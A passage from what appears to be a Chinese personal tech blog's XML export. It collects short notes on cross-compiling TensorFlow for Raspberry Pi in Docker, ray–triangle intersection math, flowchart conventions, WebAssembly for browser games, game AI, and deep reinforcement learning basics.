<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Docker容器内设置全局代理</span><br><span class="line">export http_proxy&#x3D;http:&#x2F;&#x2F;x.x.x.x:xx</span><br><span class="line">export https_proxy&#x3D;http:&#x2F;&#x2F;x.x.x.x:xx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 交叉编译tensorflow</span><br><span class="line">cd build_tensorflow&#x2F;</span><br><span class="line">chmod +x build_tensorflow.sh</span><br><span class="line">TF_PYTHON_VERSION&#x3D;3.7 .&#x2F;build_tensorflow.sh &lt;path-of-config&gt; [noclean]</span><br><span class="line"></span><br><span class="line"># Copying files from Docker container to host</span><br><span class="line">sudo docker cp 820e780536b6:&#x2F;tmp&#x2F;tensorflow_pkg&#x2F;tensorflow-2.3.0-cp37-none-linux_armv7l.whl .&#x2F;</span><br></pre></td></tr></table></figure>


<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.tensorflow.org/install/source_rpi?hl=zh-cn" target="_blank" rel="noopener">在树莓派设备上编译 tensorflow 源代码 </a>,by tensorflow.</li>
<li><a href="https://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener">Docker 入门教程</a>,by 阮一峰.</li>
<li><a href="https://zhuanlan.zhihu.com/p/143156163" target="_blank" rel="noopener">如何在 Ubuntu 20.04 上安装和使用 Docker</a>,by 雪梦科技.</li>
<li><a href="https://zhuanlan.zhihu.com/p/251009600" target="_blank" rel="noopener">Ubuntu 20.04系统下更改apt源为阿里源</a>,by 一缕诗风.</li>
<li><a href="https://blog.csdn.net/paulkg12/article/details/120831478" target="_blank" rel="noopener">docker:containerd.io docker-ce-cli docker-ce 的区别</a>,by 非正经研究生.</li>
<li>[Why does “drm:vmw_host_log [vmwgfx]] <em>ERROR</em> Failed to send host log message” show up and what can I do to fix it?](<a href="https://unix.stackexchange.com/questions/502540/why-does-drmvmw-host-log-vmwgfx-error-failed-to-send-host-log-message-sh),by" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/502540/why-does-drmvmw-host-log-vmwgfx-error-failed-to-send-host-log-message-sh),by</a> stackexchange.</li>
<li><a href="https://www.cnblogs.com/xiaotlili/p/3306100.html" target="_blank" rel="noopener">交叉编译器 arm-linux-gnueabi 和 arm-linux-gnueabihf 的区别</a>,by 左手牛奶，右手面包.</li>
<li><a href="https://shumeipai.nxez.com/2018/10/24/building-tensorflow-for-raspberry-pi-devices-based-on-source-code.html" target="_blank" rel="noopener">基于源代码为树莓派设备构建 TensorFlow</a>,by Spoony.</li>
<li><a href="https://yeasy.gitbook.io/docker_practice/" target="_blank" rel="noopener">Docker — 从入门到实践</a>,by yeasy.</li>
<li><a href="https://cloud.tencent.com/developer/article/1885678" target="_blank" rel="noopener">史上讲解最好的 Docker 教程，从入门到精通（建议收藏的教程）</a>,by 周辰晨.</li>
<li><a href="https://blog.csdn.net/xu710263124/article/details/115677089" target="_blank" rel="noopener">Docker篇之镜像打标签tag</a>,by 听说唐僧不吃肉.</li>
<li><a href="https://liaocy.net/2019/04/30-containerproxy/" target="_blank" rel="noopener">Docker容器内设置全局代理</a>,by Liao.</li>
<li><a href="https://blog.csdn.net/elaine_bao/article/details/78668657" target="_blank" rel="noopener">Bazel入门：编译C++项目</a>,by Elaine_Bao.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>硬件</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派连接访问方法</title>
    <url>/2022/05/11/%E6%A0%91%E8%8E%93%E6%B4%BE%E8%BF%9E%E6%8E%A5%E8%AE%BF%E9%97%AE%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>给树莓派3B安装好系统后，接下来就是访问树莓派了。主要有三种方法：</p>
<h1 id="鼠标键盘显示器法"><a href="#鼠标键盘显示器法" class="headerlink" title="鼠标键盘显示器法"></a>鼠标键盘显示器法</h1><h1 id="USB转串口连接法"><a href="#USB转串口连接法" class="headerlink" title="USB转串口连接法"></a>USB转串口连接法</h1><p>请参考<a href="https://huangwang.github.io/2018/11/05/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AD%A6%E4%B9%A0%E4%B9%8BUSB%E8%BD%AC%E4%B8%B2%E5%8F%A3/">树莓派学习之USB转串口</a></p>
<h1 id="无线网络连接法"><a href="#无线网络连接法" class="headerlink" title="无线网络连接法"></a>无线网络连接法</h1><p>如果存在树莓派连接好wifi后无法上网的问题，请参考<a href="https://blog.csdn.net/wjd956574941/article/details/123257114" target="_blank" rel="noopener">树莓派 3B+/4B 连接“手机热点“或“WiFi“ 后无法上网（必解）</a></p>
<h1 id="有线网络直连法"><a href="#有线网络直连法" class="headerlink" title="有线网络直连法"></a>有线网络直连法</h1><p>请参考<a href="https://zhuanlan.zhihu.com/p/37761024" target="_blank" rel="noopener">树莓派使用网线直连电脑的方法</a>。</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/37761024" target="_blank" rel="noopener">树莓派使用网线直连电脑的方法</a>,by 晒月亮的孩子.</li>
<li><a href="https://zhuanlan.zhihu.com/p/35161674" target="_blank" rel="noopener">树莓派3B无显示屏安装系统及远程登录</a>,by 晒月亮的孩子.</li>
<li><a href="https://huangwang.github.io/2018/11/05/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AD%A6%E4%B9%A0%E4%B9%8BUSB%E8%BD%AC%E4%B8%B2%E5%8F%A3/">树莓派学习之USB转串口</a>,by jackhuang.</li>
<li><a href="https://www.cnblogs.com/hxun/p/10824149.html" target="_blank" rel="noopener">Raspberry Pi (树莓派) 更换源 - stretch 版本</a>,by 佩奇er.</li>
<li><a href="http://muhongqiao.top/?id=341" target="_blank" rel="noopener">树莓派安装pyenv</a>,by 穆琪的博客.</li>
<li><a href="https://zlotus.github.io/2018/09/25/rbp3-aws-gateway/" target="_blank" rel="noopener">树莓派上的上网</a>,by 子实.</li>
<li><a href="https://blog.csdn.net/wjd956574941/article/details/123257114" target="_blank" rel="noopener">树莓派 3B+/4B 连接“手机热点“或“WiFi“ 后无法上网（必解）</a>,by wjd956574941.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>硬件</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>求解射线与三角形交点的算法</title>
    <url>/2019/06/04/%E6%B1%82%E8%A7%A3%E5%B0%84%E7%BA%BF%E4%B8%8E%E4%B8%89%E8%A7%92%E5%BD%A2%E4%BA%A4%E7%82%B9%E7%9A%84%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>求解射线与三角形的交点，在光线追踪、碰撞检测、目标拾取等场景中经常使用，是计算机图形学中最基本的操作。下面介绍常用的求解射线与三角形交点的算法。</p>
<h1 id="问题定义"><a href="#问题定义" class="headerlink" title="问题定义"></a>问题定义</h1><p>求解射线与三角形交点示意图如图1所示。</p>
<p align="center" style="display: flex;">
    <img src="images/rayInterSection1.png" width="40%" alt="求解射线与三角形交点示意图"/>
    <img src="images/rayInterSection2.png" width="40%" alt="求解射线与三角形交点示意图"/>
</p>
<center>图1  求解射线与三角形交点示意图</center>

<p>射线的参数方程如下，其中O是射线的起点，D是射线的方向，t是常数。</p>
<p>$$O+Dt$$</p>
<p>该方程的含义是一个点从起点O开始，沿着方向D移动任意长度，得到终点R，根据t值的不同，得到的R值也不同，所有这些不同的R值便构成了整条射线，比如下面的射线，起点是P0，方向是u，p0 + tu也就构成了整条射线。</p>
<p align="center">
    <img src="images/ray.jpeg" width="50%" alt="射线方程示意图"/>
</p>
<center>图2  射线方程示意图</center>

<p>三角形的参数方程如下，其中$V_0$，$V_1$和$V_2$是三角形的三个点，$u, v$是$V_1$和$V_2$的权重，$1-u-v$是$V_0$的权重，并且满足$u&gt;=0, v &gt;= 0,u+v&lt;=1$。</p>
<p>$$(1-u-v)V_0+uV_1+vV_2$$</p>
<p align="center">
    <img src="images/triangle.png" width="50%" alt="三角形方程示意图"/>
</p>
<center>图3  三角形方程示意图</center>


<h1 id="直观方法"><a href="#直观方法" class="headerlink" title="直观方法"></a>直观方法</h1><p>求解射线与三角形的交点最直观的方法如下：</p>
<ol>
<li>判断射线是否与平面相交</li>
<li>判断点是否在三角形内</li>
</ol>
<p>但该方法需要额外计算三角形所在平面，效率不高。</p>
<h1 id="Moller-Trumbore方法-Journal-of-Graphic-Tools-1997"><a href="#Moller-Trumbore方法-Journal-of-Graphic-Tools-1997" class="headerlink" title="Moller-Trumbore方法(Journal of Graphic Tools, 1997)"></a>Moller-Trumbore方法(Journal of Graphic Tools, 1997)</h1><p>Moller-Trumbore方法中，求射线与三角形的交点即求解如下方程:</p>
<p>$$O+Dt=(1-u-v)V_0+uV_1+vV_2$$</p>
<p>其中t,u,v是未知数，其他都是已知的。</p>
<p>移项并整理，将t,u,v提取出来作为未知数，得到下面的线性方程组：</p>
<p>$$\begin{bmatrix}<br>    -D&amp; V_1-V_0 &amp;V_2-V_0<br>\end{bmatrix}\begin{bmatrix}<br>    t\u\v<br>\end{bmatrix}=O-V_0$$</p>
<p>现在开始解这个方程组，这里要用到两个知识点，一是克莱姆法则，二是向量的混合积。</p>
<p>令$E_1 = V_1 - V_0，E_2 = V_2 - V_0，T = O - V_0$上式可以改写成:</p>
<p>$$\begin{bmatrix}<br>    -D&amp; E_1 &amp; E_2<br>\end{bmatrix}\begin{bmatrix}<br>    t\u\v<br>\end{bmatrix}=T$$</p>
<p>根据克莱姆法则，可得到t,u,v的解为：</p>
<p>$$<br>\begin{bmatrix}<br>    t\u\v<br>\end{bmatrix}<br>=\frac{1}{\begin{vmatrix}<br>    -D &amp; E_1 &amp; E_2<br>\end{vmatrix} }<br>\begin{vmatrix}<br>    T&amp;E_1&amp;E_2\<br>    -D&amp; T&amp; E_2\<br>    -D &amp; E_1&amp; T<br>\end{vmatrix}<br>$$</p>
<p>根据混合积公式:</p>
<p>$$\begin{vmatrix}<br>    a&amp;b&amp;c<br>\end{vmatrix}<br>=a\times{b}\cdot{c}$$</p>
<p>上式改写为：</p>
<p>$$<br>\begin{bmatrix}<br>    t\u\v<br>\end{bmatrix}<br>=\frac{1}{\begin{bmatrix}<br>    -D \times E_2 \cdot E_1<br>\end{bmatrix} }<br>\begin{vmatrix}<br>    T \times E_1 \cdot E_2\<br>    D \times E_2 \cdot T\<br>    T \times E_1 \cdot D<br>\end{vmatrix}<br>$$</p>
<p>令$P=D \times E_2$，$Q=T \times E_1$，得到最终的公式:</p>
<p>$$\begin{bmatrix}<br>    t\u\v<br>\end{bmatrix}<br>=\frac{1}{\begin{bmatrix}<br>    P \cdot E_1<br>\end{bmatrix} }<br>\begin{vmatrix}<br>    Q \cdot E_2\<br>    P \cdot T\<br>    Q \cdot D<br>\end{vmatrix}<br>$$</p>
<p>之所以提炼出P和Q是为了避免重复计算。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/graphics/archive/2010/08/09/1795348.html" target="_blank" rel="noopener">射线和三角形的相交检测（ray triangle intersection test）</a>,by zdd.</li>
<li><a href="http://pkuwwt.github.io/scholarship/2014-04-03-ray-triangle-intersection-tests-for-dummies/" target="_blank" rel="noopener">光线-三角形求交测试算法[译]</a>, by PKUWWT.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%85%8B%E8%90%8A%E5%A7%86%E6%B3%95%E5%89%87" target="_blank" rel="noopener">克莱姆法则</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E4%B8%89%E9%87%8D%E7%A7%AF" target="_blank" rel="noopener">混合积</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%87%8D%E5%BF%83%E5%9D%90%E6%A0%87" target="_blank" rel="noopener">重心坐标</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/58199366" target="_blank" rel="noopener">重心坐标（Barycentric coordinates）</a>,by 杨超.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>深度强化学习的实验环境汇总</title>
    <url>/2021/06/07/%E6%B7%B1%E5%BA%A6%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/105293343" target="_blank" rel="noopener">深度强化学习中实验环境-开源平台框架汇总</a>,by 小小何先生.</li>
<li><a href="https://blog.csdn.net/bigheadyushan/article/details/81019691" target="_blank" rel="noopener">强化学习实验环境 I (MuJoCo, OpenAI Gym, rllab, DeepMind Lab, TORCS, PySC2)</a>,by AITBOOK.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>流程图绘制规范</title>
    <url>/2020/04/25/%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%BB%98%E5%88%B6%E8%A7%84%E8%8C%83/</url>
    <content><![CDATA[<p>流程图是表示算法、工作流或流程的一种框图表示，它以不同类型的框代表不同种类的步骤，每两个步骤之间则以箭头连接。这种表示方法便于说明解决已知问题的方法。流程图在分析、设计、记录及操控许多领域的流程或程序都有广泛应用。遵循规范绘制流程图，不仅可提高流程图的可读性，还可以美化流程图。</p>
<h1 id="流程图的三大结构"><a href="#流程图的三大结构" class="headerlink" title="流程图的三大结构"></a>流程图的三大结构</h1><p>流程图由三大结构构成，这三大结构分别为顺序结构、选择结构和循环结构，这三个结构构成了流程执行的全过程。</p>
<ul>
<li>顺序结构</li>
</ul>
<p>在顺序结构中，各个步骤是按先后顺序执行的，这是一种最简单的基本结构。</p>
<ul>
<li>选择结构</li>
</ul>
<p>选择结构又称分支结构，选择结构用于判断给定的条件，根据判断的结果判断某些条件，根据判断的结果来控制程序的流程。</p>
<ul>
<li>循环结构</li>
</ul>
<p>循环结构又称为重复结构，就是流程在一定的条件下，反复执行某一操作的流程结构。循环结构下又可以分为当型结构和直到型结构。</p>
<h1 id="绘制流程图中的注意事项"><a href="#绘制流程图中的注意事项" class="headerlink" title="绘制流程图中的注意事项"></a>绘制流程图中的注意事项</h1><ul>
<li><p>绘制流程图时，为了提高流程图的逻辑性，应遵循从左到右、从上到下的顺序排列。</p>
</li>
<li><p>绘制流程图时，为了提高流程图的逻辑性，应遵循从左到右、从上到下的顺序排列。一个流程从开始符开始，以结束符结束。开始符号只能出现一次，而结束符号可出现多次。若流程足够清晰，可省略开始、结束符号。</p>
</li>
<li><p>菱形为判断符号，必须要有“是和否（或Y和N）”两种处理结果，意思是说，菱形判断框一定需要有两条箭头流出；且判断符号的上下端流入流出一般用“是（或Y）”，左右端流入流出用“否（或Y）”。</p>
</li>
<li><p>同一流程图内，符号大小需要保持一致，同时连接线不能交叉，连接线不能无故弯曲。</p>
</li>
<li><p>流程处理关系为并行关系的，需要将流程放在同一高度。</p>
</li>
<li><p>必要时应采用标注，以此来清晰地说明流程，标注要用专门的标注符号。</p>
</li>
<li><p>处理流程须以单一入口和单一出口绘制，同一路径的指示箭头应只有一个。</p>
</li>
<li><p>同一路径的指示箭头应只有一个。</p>
</li>
<li><p>流程图中，如果有参考其他已经定义的流程，不需重复绘制，直接用已定义流程符号即可。</p>
</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://www.woshipm.com/zhichang/2329530.html" target="_blank" rel="noopener">画了多年的流程图，你真的画规范了吗？</a>,by Hiphop村.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%B5%81%E7%A8%8B%E5%9B%BE" target="_blank" rel="noopener">流程图</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器中运行3D游戏的思考</title>
    <url>/2018/07/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E8%BF%90%E8%A1%8C3D%E6%B8%B8%E6%88%8F%E7%9A%84%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<p>Web技术突飞猛进，几乎无所不能，无所不在。然而在3D游戏领域，web技术乏善可陈，性能瓶颈问题制约其发展。但是开发者们没有放弃这个梦想，不断努力，孜孜不倦地改进和增强浏览器中运行3D游戏性能的方法和技术，目前已能看到一丝曙光。</p>
<p>对C/S架构的3D游戏而言，渲染和计算通常都在客户端，服务器端负责用户状态的管理和分发。同样对B/S架构的运行在浏览器中的3D游戏，所有的渲染和计算也应该在浏览器端。如果渲染和计算放在服务器端，将导致可怕的延迟，并严重损害3D游戏的可伸缩性。</p>
<p>当前很多3D游戏使用C/C++语言编写，如果能够将C/C++语言编译成JavaScript语言，可大大促进Web 3D游戏的开发。而编译器项目Emscripten正是一个这样的工具。它能将C/C++代码编译成一种叫做asm.js的Javascript变体。需要指出的是，Emscripten的输入，即C/C++代码最好是开放源代码的，因为Emscripten不支持闭源代码的编译。例如Emscripten不支持mfc程序的转换，因为mfc是闭源的<sup>[4]</sup>。</p>
<p>asm.js是一个JavaScript的严格子集，它只提供32位带符号整数和64位带符号浮点数两种数据类型，其他Javascript类型如字符串、布尔值等以数值形式存在，保存在内存中，通过TypedArray调用。另外asm.js没有垃圾回收机制，所有内存操作都由程序员自己控制。asm.js是优化后的JavaScript，它在浏览器中的运行速度大约是原生代码的一倍左右<sup>[1]</sup>。</p>
<p>asm.js虽然比原生javascript运行速度快了一倍左右，但是相比C/C++代码，运行速度还是有差距。幸运的是出现了名为WebAssembly的技术。WebAssembly或称wasm是一个实验性的低级编程语言，应用于浏览器内的客户端<sup>[5]</sup>。WebAssembly是便携式的抽象语法树，被设计来提供比JavaScript更快速的编译及运行。WebAssembly将让开发者能运用自己熟悉的编程语言（最初以C/C++作为实现目标）编译，再藉虚拟机引擎在浏览器内运行。WebAssembly的开发团队分别来自Mozilla、Google、Microsoft、Apple，代表着四大网络浏览器Firefox、Chrome、Microsoft Edge、Safari。2017年11月，所有以上四个浏览器都开始实验性的支持WebAssembly。目前，最新版本的Emscripten已支持将C/C++代码编译成wasm。</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="http://www.ruanyifeng.com/blog/2017/09/asmjs_emscripten.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2017/09/asmjs_emscripten.html</a>. by 阮一峰.</li>
<li><a href="https://www.cnblogs.com/slly/p/6639173.html" target="_blank" rel="noopener">https://www.cnblogs.com/slly/p/6639173.html</a>. by 李某龙.</li>
<li><a href="http://kripken.github.io/emscripten-site/" target="_blank" rel="noopener">http://kripken.github.io/emscripten-site/</a>. by emscripten.</li>
<li><a href="https://github.com/kripken/emscripten/issues/941" target="_blank" rel="noopener">https://github.com/kripken/emscripten/issues/941</a>. by emscripten.</li>
<li><a href="https://zh.wikipedia.org/wiki/WebAssembly" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/WebAssembly</a>. by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title>游戏开发的基本概念</title>
    <url>/2020/10/19/%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
    <content><![CDATA[<p>使用Unity做游戏开发，那么它的一些基本概念不可不知。</p>
<h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><h1 id="游戏对象"><a href="#游戏对象" class="headerlink" title="游戏对象"></a>游戏对象</h1><h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><h1 id="资产"><a href="#资产" class="headerlink" title="资产"></a>资产</h1><h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts/" target="_blank" rel="noopener">Unity游戏开发者需知的基本概念</a>,by Eyas.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机图形学</tag>
        <tag>游戏</tag>
      </tags>
  </entry>
  <entry>
    <title>游戏AI开发方法</title>
    <url>/2022/10/19/%E6%B8%B8%E6%88%8FAI%E5%BC%80%E5%8F%91%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>现有游戏AI基本通过下面两个方式进行实现：行为树（Behavior Tree）与有限状态机（Finite State Machines）。</p>
<h1 id="有限状态机"><a href="#有限状态机" class="headerlink" title="有限状态机"></a>有限状态机</h1><p>“状态机”是一种表示状态并控制状态切换的设计模式，常常用于设计某种东西的多个状态。而有限状态机是指游戏内的条件逻辑封装到各个状态类里。例如一个人有站立状态，跑动状态，走路状态，蹲下状态，开火状态等，当一个事件发生，将会触发一个动作，或者执行一次状态的迁移。</p>
<h1 id="行为树"><a href="#行为树" class="headerlink" title="行为树"></a>行为树</h1><p>行为树是一棵用于控制 AI 决策行为的、包含了层级节点的树结构。树的最末端——叶子，就是这些 AI 实际上去做事情的命令；连接树叶的树枝，就是各种类型的节点，这些节点决定了 AI 如何从树的顶端根据不同的情况，来沿着不同的路径来到最终的叶子这一过程。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/82567889" target="_blank" rel="noopener">游戏AI入门及AI优化</a>,by 泪的天堂.</li>
<li><a href="https://www.gameres.com/846263.html" target="_blank" rel="noopener">AI 行为树的工作原理</a>,by INDIENOVA.</li>
<li><a href="https://gameinstitute.qq.com/article/10030" target="_blank" rel="noopener">游戏AI：AI的游戏还是游戏的未来</a>,by Jim.</li>
<li><a href="https://www.cnblogs.com/KillerAery/p/10003678.html" target="_blank" rel="noopener">游戏AI之初步介绍</a>,by KillerAery.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机图形学</tag>
        <tag>游戏</tag>
      </tags>
  </entry>
  <entry>
    <title>求三个球交点的方法</title>
    <url>/2020/09/04/%E6%B1%82%E4%B8%89%E4%B8%AA%E7%90%83%E4%BA%A4%E7%82%B9%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>我们知道，在使用美国GPS时，需要获得三颗GPS卫星信号，才能够定位自身位置。那么其背后的原理是什么呢？很简单，用数学语言表述，就是通过求解三个球的交点。通常三个球的交点会有两个点，排除位置较高的那个点，剩下的点就是我们空间位置点。</p>
<p align="center">
    <img src="images/gps_location.jpg" width="90%" alt="GPS定位原理示意图"/>
</p>
<center>图1  GPS定位原理示意图</center>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.digitalbunker.dev/2020/08/28/how-do-global-positioning-systems-gps-work/" target="_blank" rel="noopener">How Does GPS Work?</a>,by Aryaman Sharda.</li>
<li><a href="https://blog.csdn.net/sinat_27504423/article/details/47377763" target="_blank" rel="noopener">三个球的交点</a>,by sinat_27504423.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>深度强化学习研究笔记</title>
    <url>/2018/11/26/%E6%B7%B1%E5%BA%A6%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>深度强化学习Deep Reinforcement Learning是将深度学习与强化学习结合起来，从而实现从Perception感知到Action动作的端对端学习End-to-End Learning的一种全新的算法。深度强化学习具备使机器人实现真正完全自主地学习一种甚至多种技能的潜力。</p>
<h1 id="深度强化学习的起源"><a href="#深度强化学习的起源" class="headerlink" title="深度强化学习的起源"></a>深度强化学习的起源</h1><p>深度强化学习是深度学习与强化学习相结合的产物。</p>
<h2 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h2><p>深度学习（deep learning）是机器学习的分支，是一种试图使用包含复杂结构或由多重非线性变换构成的多个处理层对数据进行高层抽象的算法。</p>
<p>深度学习是机器学习中一种基于对数据进行表征学习的算法。观测值（例如一幅图像）可以使用多种方式来表示，如每个像素强度值的向量，或者更抽象地表示成一系列边、特定形状的区域等。而使用某些特定的表示方法更容易从实例中学习任务（例如，人脸识别或面部表情识别）。深度学习的好处是用非监督式或半监督式的特征学习和分层特征提取高效算法来替代手工获取特征。</p>
<p>表征学习的目标是寻求更好的表示方法并创建更好的模型来从大规模未标记数据中学习这些表示方法。表示方法来自神经科学，并松散地创建在类似神经系统中的信息处理和对通信模式的理解上，如神经编码，试图定义拉动神经元的反应之间的关系以及大脑中的神经元的电活动之间的关系。</p>
<p>至今已有数种深度学习框架，如深度神经网络、卷积神经网络和深度置信网络和递归神经网络已被应用在计算机视觉、语音识别、自然语言处理、音频识别与生物信息学等领域并获取了极好的效果。</p>
<p>另外，“深度学习”已成为类似术语，或者说是神经网络的品牌重塑。</p>
<h3 id="深度神经网络"><a href="#深度神经网络" class="headerlink" title="深度神经网络"></a>深度神经网络</h3><p>深度神经网络是一种具备至少一个隐层的神经网络。与浅层神经网络类似，深度神经网络也能够为复杂非线性系统提供建模，但多出的层次为模型提供了更高的抽象层次，因而提高了模型的能力。</p>
<p>深度神经网络（Deep Neural Networks, DNN）是一种判别模型，可以使用反向传播算法进行训练。权重更新可以使用下式进行随机梯度下降法求解：</p>
<p>$$\Delta w_{ij}(t+1)=\Delta w_{ij}(t) +  \eta\frac{\partial C}{\partial w_{ij}}$$</p>
<p>其中，$\eta$为学习率，$C$为代价函数。这一函数的选择与学习的类型（例如监督学习、无监督学习、增强学习）以及激活函数相关。例如，为了在一个多分类问题上进行监督学习，通常的选择是使用ReLU作为激活函数，而使用交叉熵作为代价函数。Softmax函数定义为${\displaystyle p_{j}={\frac {\exp(x_{j})}{\sum <em>{k}\exp(x</em>{k})}}}$，其中 ${\displaystyle p_{j}}$代表类别 ${\displaystyle j}$的概率，而 ${\displaystyle x_{j}}$和 ${\displaystyle x_{k}}$分别代表对单元 ${\displaystyle j}$ 和 ${\displaystyle k}$的输入。交叉熵定义为 $C = -\sum_j d_j \log(p_j)$ ，其中 ${\displaystyle d_{j}}$代表输出单元${\displaystyle j}$的目标概率， ${\displaystyle p_{j}}$代表应用了激活函数后对单元 ${\displaystyle j}$的概率输出。</p>
<h2 id="强化学习"><a href="#强化学习" class="headerlink" title="强化学习"></a>强化学习</h2><p>在人工智能领域，一般用智能体Agent表示一个具备行为能力的物体，比如机器人，无人车等等。而强化学习则研究智能体Agent和环境Environment之间交互过程如何取得任务的成功。</p>
<p>强化学习与环境的交互过程如图1所示。在某个时间点，智能体Agent会获得观察值(Observation)和反馈值(Reward)，然后根据这些选择下一步的动作(Action)。</p>
<p align="center">
    <img src="images/reinforce_learning.png" width="90%" alt="强化学习示意图"/>
</p>
<center>图1 强化学习示意图</center>

<p>在整个过程中，任务的目标是获取尽可能多的Reward，这是任务的目标。而在每个时间片，Agent都是根据当前的观察来确定下一步的动作。观察Observation的集合就作为Agent的所处的状态State，因此，状态State和动作Action存在映射关系，也就是一个state可以对应一个action，或者对应不同动作的概率（常常用概率来表示，概率最高的就是最值得执行的动作）。状态与动作的关系其实就是输入与输出的关系，而状态State到动作Action的过程就称之为一个策略Policy，一般用 $\pi$  表示，也就是需要找到以下关系：<br>$$a=\pi(s)$$<br>或者<br>$$\pi(a|s)$$</p>
<p>其中a是action，s是state。第一种是一一对应的表示，第二种是概率的表示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">强化学习的任务就是找到一个最优的策略Policy从而使Reward最多。</span><br></pre></td></tr></table></figure>

<p>强化学习的训练一开始从采用随机策略进行试验开始，可获得一系列的状态,动作和反馈：<br>$${s_1,a_1,r_1,s_2,a_2,r_2,…,s_t,a_t,r_t}$$<br>根据这一系列样本，强化学习从中改进策略，使得任务反馈Reward越来越多。</p>
<h3 id="强化学习分类"><a href="#强化学习分类" class="headerlink" title="强化学习分类"></a>强化学习分类</h3><p>在Model-free 算法里面，最为常见的分类方案是根据模型的表示方式来对算法进行分类。在这种分类方法中，RL算法可以划分为3个类别:</p>
<ul>
<li>Critic-only，在Critic-only 类算法中，模型只有值评估函数。</li>
<li>Actor-only，在Actor-only类算法中，模型是通过一个策略函数 $\pi(a_t|s_t)$ 来表示</li>
<li>Actor-critic, 在Actor-critic 算法中，模型通过同时学习值评估函数以及策略函数一起强化算法。</li>
</ul>
<p align="center">
    <img src="images/分类1.jpg" width="90%" alt="强化学习分类"/>
</p>
<center>图2 强化学习分类</center>

<p>第二种分类方式是根据模型的学习特性来区分的，一般可以分为：</p>
<ul>
<li>On-policy</li>
<li>Off-policy</li>
</ul>
<p align="center">
    <img src="images/分类2.jpg" width="90%" alt="强化学习分类"/>
</p>
<center>图3 强化学习分类</center>


<h3 id="强化学习模型假设"><a href="#强化学习模型假设" class="headerlink" title="强化学习模型假设"></a>强化学习模型假设</h3><p>强化学习的研究建立在经典物理学基础上，基于以下两种假设：</p>
<ol>
<li>时间是可以分割成一个一个时间片的，并且有完全的先后顺序。</li>
<li>上帝不掷筛子！如果输入是确定的，那么输出也一定是确定的。</li>
</ol>
